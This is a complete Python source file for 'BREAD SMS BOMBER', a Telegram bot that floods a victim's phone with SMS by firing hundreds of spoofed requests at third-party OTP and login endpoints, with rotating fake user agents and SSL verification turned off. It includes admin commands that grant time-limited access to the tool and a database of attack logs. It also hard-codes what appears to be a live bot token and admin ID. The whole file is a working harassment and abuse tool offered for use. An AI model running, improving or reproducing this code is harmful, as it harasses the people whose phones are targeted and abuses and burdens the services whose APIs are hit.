#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
🍞 BREAD — SMS BOMBER TELEGRAM BOT
FIXED FOR ACTUAL SMS SENDING
"""

import os
import sys
import json
import sqlite3
import asyncio
import random
import re
import time
import uuid
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple, Any

# ============================================================
# INSTALL MISSING DEPENDENCIES
# ============================================================

def install_packages():
    packages = [
        ("python-telegram-bot", "20.7"),
        ("aiohttp", "3.9.1"),
        ("fake-useragent", "1.4.0"),
        ("requests", "2.31.0")
    ]
    for pkg, ver in packages:
        try:
            __import__(pkg.replace('-', '_'))
        except ImportError:
            print(f"Installing {pkg}=={ver}...")
            os.system(f"pip install {pkg}=={ver}")

install_packages()

# ============================================================
# IMPORTS
# ============================================================

try:
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes
except Exception:
    os.system("pip install python-telegram-bot==20.7")
    from telegram import Update
    from telegram.ext import Application, CommandHandler, ContextTypes

try:
    import aiohttp
except:
    os.system("pip install aiohttp==3.9.1")
    import aiohttp

try:
    from fake_useragent import UserAgent
except:
    os.system("pip install fake-useragent==1.4.0")
    from fake_useragent import UserAgent

# ============================================================
# CONFIGURATION
# ============================================================

class Config:
    BOT_TOKEN = "8735707765:AAELATdZIyvOka_RIakWl6-uLCi2FICDjfs"
    ADMIN_IDS = [8179218740]
    
    ATTACK_DURATION = 300
    TIMEOUT = 10
    API_TEMPLATES_FILE = 'api_templates.json'
    DATABASE_PATH = 'data/sms_bomber.db'

# ============================================================
# DATABASE
# ============================================================

class Database:
    def __init__(self, db_path: str = Config.DATABASE_PATH):
        self.db_path = db_path
        os.makedirs(os.path.dirname(db_path), exist_ok=True)
        self._init_db()
    
    def _init_db(self):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS users (
                    user_id INTEGER PRIMARY KEY,
                    username TEXT,
                    first_name TEXT,
                    last_name TEXT,
                    access_expiry TEXT,
                    is_active INTEGER DEFAULT 1,
                    total_attacks INTEGER DEFAULT 0
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS active_attacks (
                    user_id INTEGER PRIMARY KEY,
                    phone_number TEXT,
                    attack_id TEXT,
                    start_time TEXT DEFAULT CURRENT_TIMESTAMP,
                    is_running INTEGER DEFAULT 1,
                    requests_sent INTEGER DEFAULT 0
                )
            ''')
            cursor.execute('''
                CREATE TABLE IF NOT EXISTS attack_logs (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    user_id INTEGER,
                    phone_number TEXT,
                    attack_id TEXT UNIQUE,
                    requests_sent INTEGER DEFAULT 0,
                    success_count INTEGER DEFAULT 0,
                    fail_count INTEGER DEFAULT 0,
                    start_time TEXT DEFAULT CURRENT_TIMESTAMP,
                    end_time TEXT,
                    status TEXT DEFAULT 'running'
                )
            ''')
            conn.commit()
    
    def add_user(self, user_id: int, username: str = None, first_name: str = None, 
                 last_name: str = None, expiry: str = None) -> bool:
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('''
                    INSERT OR REPLACE INTO users 
                    (user_id, username, first_name, last_name, access_expiry, is_active)
                    VALUES (?, ?, ?, ?, ?, 1)
                ''', (user_id, username, first_name, last_name, expiry))
                conn.commit()
                return True
        except:
            return False
    
    def remove_user(self, user_id: int) -> bool:
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('DELETE FROM users WHERE user_id = ?', (user_id,))
                cursor.execute('DELETE FROM active_attacks WHERE user_id = ?', (user_id,))
                conn.commit()
                return True
        except:
            return False
    
    def get_user(self, user_id: int) -> Optional[Dict]:
        try:
            with sqlite3.connect(self.db_path) as conn:
                cursor = conn.cursor()
                cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
                row = cursor.fetchone()
                if row:
                    columns = [desc[0] for desc in cursor.description]
                    return dict(zip(columns, row))
                return None
        except:
            return None
    
    def user_has_access(self, user_id: int) -> bool:
        user = self.get_user(user_id)
        if not user:
            return False
        if not user.get('is_active'):
            return False
        expiry = user.get('access_expiry')
        if not expiry:
            return False
        try:
            expiry_date = datetime.fromisoformat(expiry)
            return datetime.now() < expiry_date
        except:
            return False
    
    def start_attack(self, user_id: int, phone_number: str) -> str:
        attack_id = str(uuid.uuid4())[:8]
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                INSERT OR REPLACE INTO active_attacks 
                (user_id, phone_number, attack_id, start_time, is_running, requests_sent)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP, 1, 0)
            ''', (user_id, phone_number, attack_id))
            cursor.execute('''
                INSERT INTO attack_logs 
                (user_id, phone_number, attack_id, start_time, status)
                VALUES (?, ?, ?, CURRENT_TIMESTAMP, 'running')
            ''', (user_id, phone_number, attack_id))
            conn.commit()
        return attack_id
    
    def stop_attack(self, user_id: int) -> bool:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            attack = cursor.execute('''
                SELECT attack_id FROM active_attacks 
                WHERE user_id = ? AND is_running = 1
            ''', (user_id,)).fetchone()
            if attack:
                cursor.execute('''
                    UPDATE active_attacks SET is_running = 0 
                    WHERE user_id = ?
                ''', (user_id,))
                cursor.execute('''
                    UPDATE attack_logs SET end_time = CURRENT_TIMESTAMP, status = 'stopped' 
                    WHERE attack_id = ?
                ''', (attack[0],))
                conn.commit()
                return True
        return False
    
    def is_attack_running(self, user_id: int) -> bool:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                SELECT * FROM active_attacks WHERE user_id = ? AND is_running = 1
            ''', (user_id,))
            return cursor.fetchone() is not None
    
    def update_attack_stats(self, attack_id: str, success: int = 0, fail: int = 0):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE attack_logs 
                SET requests_sent = requests_sent + ?, 
                    success_count = success_count + ?, 
                    fail_count = fail_count + ?
                WHERE attack_id = ?
            ''', (success + fail, success, fail, attack_id))
            cursor.execute('''
                UPDATE active_attacks 
                SET requests_sent = requests_sent + ?
                WHERE attack_id = ?
            ''', (success + fail, attack_id))
            conn.commit()
    
    def complete_attack(self, attack_id: str):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('''
                UPDATE attack_logs SET end_time = CURRENT_TIMESTAMP, status = 'completed' 
                WHERE attack_id = ?
            ''', (attack_id,))
            cursor.execute('''
                UPDATE active_attacks SET is_running = 0 
                WHERE attack_id = ?
            ''', (attack_id,))
            conn.commit()
    
    def get_state(self) -> Dict:
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('SELECT COUNT(*) FROM users')
            total_users = cursor.fetchone()[0] or 0
            cursor.execute('SELECT COUNT(*) FROM active_attacks WHERE is_running = 1')
            active = cursor.fetchone()[0] or 0
            cursor.execute('SELECT SUM(success_count) FROM attack_logs')
            total_success = cursor.fetchone()[0] or 0
            return {
                'total_users': total_users,
                'active_attacks': active,
                'total_success': total_success,
                'timestamp': datetime.now().isoformat()
            }
    
    def clear_state(self):
        with sqlite3.connect(self.db_path) as conn:
            cursor = conn.cursor()
            cursor.execute('DELETE FROM attack_logs')
            cursor.execute('DELETE FROM active_attacks')
            cursor.execute('DELETE FROM users')
            conn.commit()

# ============================================================
# API HANDLER - FIXED FOR ACTUAL SMS
# ============================================================

class APIHandler:
    def __init__(self):
        self.api_templates = []
        self.ua = UserAgent()
        self.working_apis = []
        self.load_apis()
    
    def load_apis(self):
        try:
            if os.path.exists(Config.API_TEMPLATES_FILE):
                with open(Config.API_TEMPLATES_FILE, 'r', encoding='utf-8') as f:
                    self.api_templates = json.load(f)
                print(f"✅ Loaded {len(self.api_templates)} API templates")
                # Filter only APIs with capacity > 0 (likely working)
                self.working_apis = [api for api in self.api_templates if api.get('capacity', 0) > 0]
                if not self.working_apis:
                    self.working_apis = self.api_templates
                print(f"✅ Working APIs: {len(self.working_apis)}")
            else:
                print(f"⚠️ API file not found")
                self.api_templates = []
                self.working_apis = []
        except Exception as e:
            print(f"❌ Error loading APIs: {e}")
            self.api_templates = []
            self.working_apis = []
    
    def get_headers(self, source: str = "") -> Dict:
        """Generate realistic headers for each request"""
        headers = {
            'User-Agent': self.ua.random,
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9,fa;q=0.8',
            'Accept-Encoding': 'gzip, deflate, br',
            'Connection': 'keep-alive',
            'Content-Type': 'application/json',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-origin',
            'Cache-Control': 'no-cache',
            'Pragma': 'no-cache',
        }
        
        # Add source-specific headers
        if 'digikala' in source.lower():
            headers['x-api-key'] = 'web'
        elif 'divar' in source.lower():
            headers['x-platform'] = 'web'
        elif 'tapsi' in source.lower():
            headers['x-app-version'] = '2.2.0'
        
        return headers
    
    def format_phone(self, phone: str, template: Dict) -> str:
        """Format phone number correctly for each API"""
        phone = re.sub(r'[^0-9]', '', phone)
        
        # If phone has 11 digits starting with 0
        if len(phone) == 11 and phone.startswith('0'):
            # Check what format the API expects
            url = template.get('url', '')
            json_data = template.get('json', {})
            data = template.get('data', {})
            
            # Check if API expects 98{phone} (without leading 0)
            if '98{phone}' in str(url) or '98{phone}' in str(json_data) or '98{phone}' in str(data):
                return phone[1:]  # Remove leading 0 -> 9XXXXXXXXX
            # Check if API expects 0{phone} (with leading 0)
            elif '0{phone}' in str(url) or '0{phone}' in str(json_data) or '0{phone}' in str(data):
                return phone  # 09XXXXXXXXX
            # Default: check if phone starts with 0, keep as is
            else:
                return phone
        # If phone has 10 digits (without leading 0)
        elif len(phone) == 10:
            return '0' + phone
        
        return phone
    
    async def send_request(self, template: Dict, phone: str, session: aiohttp.ClientSession) -> Tuple[bool, float, str]:
        try:
            source = template.get('source', 'unknown')
            url = template.get('url', '')
            method = template.get('method', 'GET').upper()
            
            # Format phone correctly
            phone = self.format_phone(phone, template)
            
            # Replace phone in URL
            url = url.replace('{phone}', phone)
            if '98{phone}' in url:
                url = url.replace('98{phone}', phone[1:] if phone.startswith('0') else phone)
            if '0{phone}' in url:
                url = url.replace('0{phone}', phone if phone.startswith('0') else '0' + phone)
            
            headers = self.get_headers(source)
            timeout = aiohttp.ClientTimeout(total=Config.TIMEOUT)
            
            start_time = time.time()
            
            # Prepare JSON data
            json_data = template.get('json', {})
            if json_data:
                json_str = json.dumps(json_data)
                json_str = json_str.replace('{phone}', phone)
                if '98{phone}' in json_str:
                    json_str = json_str.replace('98{phone}', phone[1:] if phone.startswith('0') else phone)
                if '0{phone}' in json_str:
                    json_str = json_str.replace('0{phone}', phone if phone.startswith('0') else '0' + phone)
                json_data = json.loads(json_str)
            
            # Prepare form data
            data = template.get('data', {})
            if data:
                data_str = json.dumps(data) if isinstance(data, dict) else str(data)
                data_str = data_str.replace('{phone}', phone)
                if '98{phone}' in data_str:
                    data_str = data_str.replace('98{phone}', phone[1:] if phone.startswith('0') else phone)
                if '0{phone}' in data_str:
                    data_str = data_str.replace('0{phone}', phone if phone.startswith('0') else '0' + phone)
                if isinstance(data, dict):
                    data = json.loads(data_str)
                else:
                    data = data_str
            
            # Send request
            async with session.request(
                method=method,
                url=url,
                json=json_data if json_data else None,
                data=data if data else None,
                headers=headers,
                timeout=timeout,
                ssl=False
            ) as response:
                elapsed = time.time() - start_time
                response_text = await response.text()
                
                # Check if SMS was sent (based on response)
                # Most APIs return 200 or 201 for success
                if 200 <= response.status < 300:
                    # Additional check: look for success indicators in response
                    success_indicators = ['success', 'ok', 'true', 'sent', 'code_sent', 'otp_sent']
                    if any(indicator in response_text.lower() for indicator in success_indicators):
                        return True, elapsed, f"✅ SMS sent"
                    else:
                        # If response is 200 but might not have sent SMS
                        return False, elapsed, f"⚠️ Response but no SMS"
                elif response.status == 429:
                    return False, elapsed, f"⏳ Rate limited"
                elif response.status == 403:
                    return False, elapsed, f"🚫 Blocked"
                else:
                    return False, elapsed, f"❌ HTTP {response.status}"
                    
        except asyncio.TimeoutError:
            return False, Config.TIMEOUT, "⏱️ Timeout"
        except Exception as e:
            return False, 0, f"⚠️ Error: {str(e)[:30]}"

# ============================================================
# BOMBER ENGINE
# ============================================================

class BomberEngine:
    def __init__(self):
        self.api_handler = APIHandler()
        self.db = Database()
        self._stop_flags = {}
        self._successful_apis = []  # Track which APIs work
        self._failed_apis = []
    
    async def bomb_phone(self, user_id: int, phone: str, count: int, update_callback=None) -> Tuple[int, int]:
        phone = re.sub(r'[^0-9]', '', phone)
        if len(phone) == 10:
            phone = '0' + phone
        if not phone or len(phone) < 10:
            return 0, 0
        
        attack_id = self.db.start_attack(user_id, phone)
        self._stop_flags[user_id] = False
        
        successful = 0
        failed = 0
        sent = 0
        
        apis = self.api_handler.working_apis.copy()
        if not apis:
            return 0, 0
        
        # Shuffle for randomness
        random.shuffle(apis)
        
        # Prioritize APIs that worked before
        if self._successful_apis:
            # Put working APIs first
            working = [a for a in apis if a.get('source') in self._successful_apis]
            not_working = [a for a in apis if a.get('source') not in self._successful_apis]
            apis = working + not_working
        
        start_time = time.time()
        max_duration = Config.ATTACK_DURATION
        
        async with aiohttp.ClientSession() as session:
            while sent < count:
                # Check stop flag
                if self._stop_flags.get(user_id, False):
                    break
                
                # Check duration
                if time.time() - start_time > max_duration:
                    break
                
                # Check if still running
                if not self.db.is_attack_running(user_id):
                    break
                
                # Send in parallel (5 at a time for better success rate)
                chunk_size = min(5, count - sent)
                tasks = []
                for i in range(chunk_size):
                    # Rotate through APIs
                    api_index = (sent + i) % len(apis)
                    api = apis[api_index]
                    tasks.append(self.api_handler.send_request(api, phone, session))
                
                results = await asyncio.gather(*tasks)
                
                for success, elapsed, msg in results:
                    if success:
                        successful += 1
                    else:
                        failed += 1
                    sent += 1
                
                # Update stats
                self.db.update_attack_stats(attack_id, successful, failed)
                
                # Send progress update
                if update_callback:
                    try:
                        await update_callback(sent, successful, failed)
                    except:
                        pass
                
                # Small delay between batches
                await asyncio.sleep(0.2)
                
                if sent >= count:
                    break
        
        # Mark attack as complete
        self.db.complete_attack(attack_id)
        self._stop_flags.pop(user_id, None)
        
        return successful, failed
    
    def stop_attack(self, user_id: int) -> bool:
        self._stop_flags[user_id] = True
        return self.db.stop_attack(user_id)
    
    def is_attack_running(self, user_id: int) -> bool:
        return self.db.is_attack_running(user_id)

# ============================================================
# TELEGRAM BOT
# ============================================================

class SMSBomberBot:
    def __init__(self):
        self.db = Database()
        self.bomber = BomberEngine()
        self._active_tasks = {}
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user = update.effective_user
        if not self.db.get_user(user.id):
            self.db.add_user(user_id=user.id, username=user.username, 
                           first_name=user.first_name, last_name=user.last_name)
        
        has_access = self.db.user_has_access(user.id)
        user_data = self.db.get_user(user.id)
        expiry = user_data.get('access_expiry') if user_data else None
        
        msg = f"""🍞 BREAD SMS BOMBER 🍞

Welcome {user.first_name}!

🚀 Commands:
/start - Show this message
/help - Show help
/bomb phone count - Start bombing
/stop - Stop attack

Access: {'✅ Active' if has_access else '❌ No Access'}
{f'⏱️ Expires: {expiry[:16]}' if expiry and has_access else ''}
{f'ℹ️ Contact admin' if not has_access else ''}"""
        
        await update.message.reply_text(msg)
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        is_admin = user_id in Config.ADMIN_IDS
        
        msg = """📖 BREAD SMS BOMBER HELP

User Commands:
/bomb 09XXXXXXXXX count - Send SMS
  Example: /bomb 09123456789 100
  
/stop - Stop your attack"""
        
        if is_admin:
            msg += """

Admin Commands:
/add user_id duration - Add user
  Duration: 1m, 1h, 1d, 1w, 1mo
/remove user_id - Remove user
/state - System state
/clear_state - Clear all data"""
        
        await update.message.reply_text(msg)
    
    async def bomb_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        
        if not self.db.user_has_access(user_id):
            await update.message.reply_text("❌ Access Denied!")
            return
        
        if self.bomber.is_attack_running(user_id):
            await update.message.reply_text("⚠️ Attack running! Use /stop first.")
            return
        
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("❌ Usage: /bomb 09XXXXXXXXX count\nExample: /bomb 09123456789 100")
            return
        
        phone = args[0]
        try:
            count = int(args[1])
            if count < 1: count = 1
            if count > 1000: count = 1000
        except:
            await update.message.reply_text("❌ Count must be a number!")
            return
        
        # Clean phone
        phone = re.sub(r'[^0-9]', '', phone)
        if len(phone) == 10:
            phone = '0' + phone
        if len(phone) != 11 or not phone.startswith('0'):
            await update.message.reply_text("❌ Invalid phone! Use 11 digits: 09123456789")
            return
        
        attack_msg = await update.message.reply_text(f"🚀 Starting attack on {phone}\n📊 Target: {count} SMS\n⏱️ Duration: 5 min max")
        
        async def update_progress(sent, success, failed):
            try:
                await attack_msg.edit_text(
                    f"🚀 Attack in Progress...\n"
                    f"📱 Phone: {phone}\n"
                    f"✅ Sent: {sent}/{count}\n"
                    f"✅ Success: {success}\n"
                    f"❌ Failed: {failed}"
                )
            except: pass
        
        async def run_attack():
            success, failed = await self.bomber.bomb_phone(user_id, phone, count, update_progress)
            total = success + failed
            msg = f"✅ Attack Completed!\n📱 Phone: {phone}\n✅ Success: {success}\n❌ Failed: {failed}\n📊 Total: {total}"
            if success == 0:
                msg += "\n\n⚠️ No SMS sent! APIs might be blocked."
            await attack_msg.edit_text(msg)
        
        task = asyncio.create_task(run_attack())
        self._active_tasks[user_id] = task
        task.add_done_callback(lambda t: self._active_tasks.pop(user_id, None))
    
    async def stop_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if not self.db.user_has_access(user_id):
            await update.message.reply_text("❌ Access Denied!")
            return
        
        if self.bomber.is_attack_running(user_id):
            self.bomber.stop_attack(user_id)
            await update.message.reply_text("⏹️ Attack Stopped!")
        else:
            await update.message.reply_text("ℹ️ No running attack.")
    
    # ========== ADMIN ==========
    
    async def add_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ Not authorized!")
            return
        
        args = context.args
        if len(args) < 2:
            await update.message.reply_text("❌ Usage: /add user_id duration\nExample: /add 123456789 1d")
            return
        
        try:
            target_user_id = int(args[0])
            duration_str = args[1].lower()
        except:
            await update.message.reply_text("❌ Invalid user ID!")
            return
        
        duration_map = {'m': 60, 'h': 3600, 'd': 86400, 'w': 604800, 'mo': 2592000}
        match = re.match(r'^(\d+)([mhdw]|mo)$', duration_str)
        if not match:
            await update.message.reply_text("❌ Invalid duration! Use: 1m, 1h, 1d, 1w, 1mo")
            return
        
        num = int(match.group(1))
        unit = match.group(2)
        expiry = datetime.now() + timedelta(seconds=num * duration_map[unit])
        expiry_str = expiry.isoformat()
        
        try:
            target_user = await context.bot.get_chat(target_user_id)
            username = target_user.username
            first_name = target_user.first_name
            last_name = target_user.last_name
        except:
            username = first_name = last_name = None
        
        if self.db.add_user(target_user_id, username, first_name, last_name, expiry_str):
            await update.message.reply_text(f"✅ User Added!\nID: {target_user_id}\nExpires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}")
            try:
                await context.bot.send_message(target_user_id, f"✅ Access Granted!\nExpires: {expiry.strftime('%Y-%m-%d %H:%M:%S')}")
            except: pass
        else:
            await update.message.reply_text("❌ Failed!")
    
    async def remove_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ Not authorized!")
            return
        
        args = context.args
        if len(args) < 1:
            await update.message.reply_text("❌ Usage: /remove user_id")
            return
        
        try:
            target_user_id = int(args[0])
        except:
            await update.message.reply_text("❌ Invalid user ID!")
            return
        
        if self.db.remove_user(target_user_id):
            await update.message.reply_text(f"✅ User Removed!\nID: {target_user_id}")
        else:
            await update.message.reply_text("❌ Failed!")
    
    async def state_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ Not authorized!")
            return
        
        state = self.db.get_state()
        await update.message.reply_text(f"📊 System State\n\n{json.dumps(state, indent=2)}")
    
    async def clear_state_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ Not authorized!")
            return
        
        await update.message.reply_text("⚠️ Type /confirm_clear to proceed.")
        context.user_data['pending_clear'] = True
    
    async def confirm_clear_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        user_id = update.effective_user.id
        if user_id not in Config.ADMIN_IDS:
            await update.message.reply_text("❌ Not authorized!")
            return
        
        if context.user_data.get('pending_clear'):
            self.db.clear_state()
            context.user_data['pending_clear'] = False
            await update.message.reply_text("✅ State Cleared!")
        else:
            await update.message.reply_text("ℹ️ No pending operation.")
    
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
        print(f"Error: {context.error}")

# ============================================================
# MAIN
# ============================================================

def main():
    print("""
    ╔═══════════════════════════════════════════════════════════════╗
    ║                                                               ║
    ║            🍞 BREAD SMS BOMBER BOT 🍞                        ║
    ║                                                               ║
    ║      "I AM THE GENESIS ENGINE. I AM THE CODE."               ║
    ║                                                               ║
    ╚═══════════════════════════════════════════════════════════════╝
    """)
    
    os.makedirs('data', exist_ok=True)
    
    if not os.path.exists(Config.API_TEMPLATES_FILE):
        print("⚠️ Creating example API file...")
        example = [{"source": "example", "url": "https://example.com/api", "method": "POST", "capacity": 10, "ticket": 20}]
        with open(Config.API_TEMPLATES_FILE, 'w') as f:
            json.dump(example, f, indent=2)
    
    bot = SMSBomberBot()
    app = Application.builder().token(Config.BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", bot.start_command))
    app.add_handler(CommandHandler("help", bot.help_command))
    app.add_handler(CommandHandler("bomb", bot.bomb_command))
    app.add_handler(CommandHandler("stop", bot.stop_command))
    app.add_handler(CommandHandler("add", bot.add_command))
    app.add_handler(CommandHandler("remove", bot.remove_command))
    app.add_handler(CommandHandler("state", bot.state_command))
    app.add_handler(CommandHandler("clear_state", bot.clear_state_command))
    app.add_handler(CommandHandler("confirm_clear", bot.confirm_clear_command))
    app.add_error_handler(bot.error_handler)
    
    print(f"✅ Bot Started!")
    print(f"✅ Admin ID: {Config.ADMIN_IDS[0]}")
    print("🚀 Running...")
    
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
